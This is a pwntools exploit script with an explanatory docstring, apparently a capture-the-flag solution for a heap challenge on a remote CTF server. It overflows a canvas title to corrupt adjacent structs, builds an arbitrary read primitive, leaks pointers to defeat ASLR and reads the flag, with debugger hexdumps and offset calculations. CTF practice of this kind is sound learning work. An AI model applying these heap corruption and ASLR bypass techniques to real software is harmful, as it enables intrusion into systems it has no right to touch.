from pwn import *
from struct import pack, unpack
from sys import exit

DEBUG = False
REMOTE = None
REMOTE = 'ctf.segfault.me'

RVA_HEAP_ALLOC = 0xEDE  # readelf -s chal | grep heap_alloc (Windows)
RVA_HEAP_ALLOC = 0x145E  # readelf -s chal | grep heap_alloc (Linux)
RVA_FLAG_TWO = 0x203020  # readelf -s chal | grep flag_two (Windows)
RVA_FLAG_TWO = 0x5020 # readelf -s chal | grep flag_two (Linux)

if DEBUG:
    P = gdb.debug('./chal')
elif REMOTE:
    P = remote(REMOTE, 3000)
else:
    P = process(['./chal'])

P.recvuntil("> ")



def run(cmd):
    P.sendline(cmd)
    out = P.recvuntil("> ")
    return out


"""
Things are a bit more complicated now, since the second flag is not on the heap.

GOAL:

We will need to create an arbitrary read primitive that lets us read anywhere we want.
Of course, we also need to figure out where the second flag is, and this means defeating ASLR.

ARBITRARY READ:

In challenge 1, we overwrote a `canvas_t` to corrupt its canvas->private flag. In doing so,
you may have noticed that we corrupted the width and height of the canvas. Going further,
we should also be able to corrupt the `canvas->data` base address. Printing a canvas with a corrupt
`canvas->data` will likely result in a segfault, but it can also be used to perform arbitrary reads
if we can write a valid address in the `data` field.

Recall the canvas_t layout:

    typedef struct canvas_
    {
        char *title;             //  8B
        uint16_t width, height;  //  4B
        uint16_t private;        //  2B (canvas_t + 12)
        uint16_t id;             //  2B
        char *data;              //  8B
        struct canvas_ *next;    //  8B
    } canvas_t;                  // 32B (0x20)

If we overwrite data with the address of the second FLAG, we can simply print this canvas with its new ID
to recover the FLAG.

DEFEATING ASLR:

To defeat ASLR, we will need the address of any symbol in the binary, since we can compute the base
address using the formula `BASE = ADDRESS - RVA`. Once we know the base address, we can compute the absolute
address of any symbol in the binary using the same formula.

`readelf -s chal` shows that there is a symbol called `flag_two` at RVA 0x203020.

EXPLOIT:
    We know, from reading through `heap.h` that `alloc_t` has a chunk pointer, which has a
    pointer to the heap, which ultimately has a pointer to the allocator functions
    (`heap_free` and `heap_grow`). If we can leak this address, we can then leak the second flag.

    It might be tempting to try a technique similar to the first challenge, but the `canvas->title` overflow
    is quite limiting as it will stop reading bytes at the first NUL terminator it encounters, and
    would require continually re-allocating the preceding canvas.

    A more reliable solution is to use a combination of 3 canvas instances to build an easy to use
    arbitrary read primitive.
    Given the (simplified) heap layout:

        +----------+----------+----------+
        | Canvas 1 | Canvas 2 | Canvas 3 |
        +----------+----------+----------+

    The idea is as follows:


        1. Canvas 1 is freed, and re-allocated, overflowing its `title` field to
           corrupt canvas 2's width and height. The resulting `c2->data` can now
           be indexed out of bounds when performing an `edit` command.
        2. `edit` is used on Canvas 2 to accurately corrupt canvas 3.
        3. Canvas 3 is used to perform arbitrary reads of the desired size.
        4. Canvas 2 and 3 are used in conjunction to perform several complex reads
           without needing re-allocations.

    pwndbg> hexdump ((uint8_t*)c) 100
    +0000 0x7ffff75e3030  70 30 5e f7  ff 7f 00 00  27 00 0f 00  00 00 01 00  │p0^.│....│'...│....│
    +0010 0x7ffff75e3040  a0 30 5e f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │.0^.│....│....│....│
    +0020 0x7ffff75e3050  40 95 75 55  55 55 00 00  10 00 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0030 0x7ffff75e3060  00 00 00 00  00 00 00 00  80 30 5e f7  ff 7f 00 00  │....│....│.0^.│....│
>>  +0040 0x7ffff75e3070  41 74 61 72  69 00 00 00  00 00 00 00  00 00 00 00  │Atar│i...│....│....│ ; c1->title
    +0050 0x7ffff75e3080  40 95 75 55  55 55 00 00  4b 02 00 00  00 00 00 00  │@.uU│UU..│K...│....│
    +0060 0x7ffff75e3090  00 00 00 00                                         │....│    │    │    │

    ...

    pwndbg> hexdump 0x7ffff75e3070+635              v
    +0000 0x7ffff75e32eb  40 95 75 55  55 55 00 00  20 00 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0010 0x7ffff75e32fb  00 00 00 00  00 00 00 00  2b 33 5e f7  ff 7f 00 00  │....│....│+3^.│....│
    +0020 0x7ffff75e330b  4b 33 5e f7  ff 7f 00 00  3d 00 18 00  00 00 02 00  │K3^.│....│=...│....│ ; c2->width (0x3d == 61)
    +0030 0x7ffff75e331b  7b 33 5e f7  ff 7f 00 00  30 30 5e f7  ff 7f 00 00  │{3^.│....│00^.│....│

    Calculate the c2->width offset:

        0x7ffff75e330b + 8 == 0x7ffff75e3313
        0x7ffff75e3313 - 0x7ffff75e3070 == 675

    Calculate the c3->width offset from c2->data to be able to corrupt c3.

    pwndbg> hexdump 0x7ffff75e330b+0x50
    +0000 0x7ffff75e335b  40 95 75 55  55 55 00 00  ba 05 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0010 0x7ffff75e336b  00 00 00 00  00 00 00 00  35 39 5e f7  ff 7f 00 00  │....│....│59^.│....│
    +0020 0x7ffff75e337b  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│

    c2->data = 0x7ffff75e337b

    pwndbg> hexdump 0x7ffff75e3030+0x40+675+1500 150                   v
    +0000 0x7ffff75e38ef  20 20 20 20  20 20 20 2d  2d 27 20 20  20 20 20 20  │....│...-│-'..│....│
    +0010 0x7ffff75e38ff  20 20 60 2d  60 2d 2d 60  2d 2d 2e 5f  5f 5f 2e 2d  │..`-│`--`│--._│__.-│
    +0020 0x7ffff75e390f  27 2d 27 2d  2d 2d 20 20  20 20 20 20  20 20 20 20  │'-'-│--..│....│....│
    +0030 0x7ffff75e391f  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│
    +0040 0x7ffff75e392f  20 20 20 20  00 00 40 95  75 55 55 55  00 00 20 00  │....│..@.│uUUU│....│
    +0050 0x7ffff75e393f  00 00 00 00  00 00 00 00  00 00 00 00  00 00 75 39  │....│....│....│..u9│
    +0060 0x7ffff75e394f  5e f7 ff 7f  00 00 95 39  5e f7 ff 7f  00 00 25 00  │^...│...9│^...│..%.│ ; c3->width (0x25)
    +0070 0x7ffff75e395f  01 00 01 00  03 00 c5 39  5e f7 ff 7f  00 00 0b 33  │....│...9│^...│...3│ ; c3->height, c3->private, c3->id, c3->data
    +0080 0x7ffff75e396f  5e f7 ff 7f  00 00 40 95  75 55 55 55  00 00 10 00  │^...│..@.│uUUU│....│
    +0090 0x7ffff75e397f  00 00 00 00  00 00

    0x7ffff75e395d - 0x7ffff75e337b = 1506
"""
C1_SIZE = 675  # Offset between c1->title and c2->width
C3_SIZE = 1506  # offset between c2->data and c3->width


def corrupt_c2():
    info("Corrupting canvas2")
    run("del 1")
    run("new")
    run("10")
    run("10")
    run("A" * C1_SIZE + "\xFF\xFF\x01")
    # Now c2->width is 0xFFFF and c2->height is 1.


def read(addr, size):
    info(f"Reading {size} bytes @ 0x{addr:016x}")
    cmd = (
        pack("<H", size)  # c3->width
        + pack("<H", 1)  # c3->height
        + b"\0\0"  # c3->private
        + pack("<H", 3)  # c3->id
        + pack("<Q", addr)  # c3->data
    )

    if b"\x0a" in cmd:
        error("Bad byte in canvas3! new line is not allowed.")
        exit(1)

    P.sendline(
        "edit 2"
    )  # We will edit the 65535x1 buffer. `fgets` stops reading at `\n`.
    P.recvuntil("New Data: ")
    P.send((b"3" * C3_SIZE) + cmd + b"\x0a")
    P.recvuntil(b"> ")
    out = run("show 3")
    return out[:size]


corrupt_c2()

# Now let's show the buffer for c2->data, which will leak 0xFFFF bytes including the actual buffer bytes.
# This will let us `show 2` and leak the address of the chunk.
# Remember that the canvas_t struct starts with title, width, so we can use C3_SIZE - 8 - sizeof(alloc_t) to calculate the
# position of alloc->chunk.
CHUNK_OFFSET = C3_SIZE - 8 - 32
(chunk_ptr,) = unpack("<Q", run("show 2")[CHUNK_OFFSET : CHUNK_OFFSET + 8])
success(f"chunk @ 0x{chunk_ptr:x}")

# Now we can configure C3 to leak the chunk_t struct, which contains the heap pointer:
#
#     typedef struct chunk_
#     {
#         struct heap_ *heap;
#         struct alloc_ *allocs;
#         struct chunk_ *next;
#     } chunk_t;


(heap_ptr,) = unpack("<Q", read(chunk_ptr, 8))
success(f"heap @ 0x{heap_ptr:x}")

# Finally we can leak the `heap_alloc` address to defeat ASLR. Having a known function pointer
# in the image will let us compute the base address, and any other known symbol in the image.
# heap_alloc is located at `heap_t + 16`.

(heap_alloc,) = unpack("<Q", read(heap_ptr + 16, 8))
success(f"heap_alloc @ 0x{heap_alloc:x}")

BASE = heap_alloc - RVA_HEAP_ALLOC
FLAG = BASE + RVA_FLAG_TWO

info(f"BaseAddress=0x{BASE:x} FlagAddress=0x{FLAG:x}")

flag = read(FLAG, 37).decode()
success(f"FLAG: {flag}")

P.close()
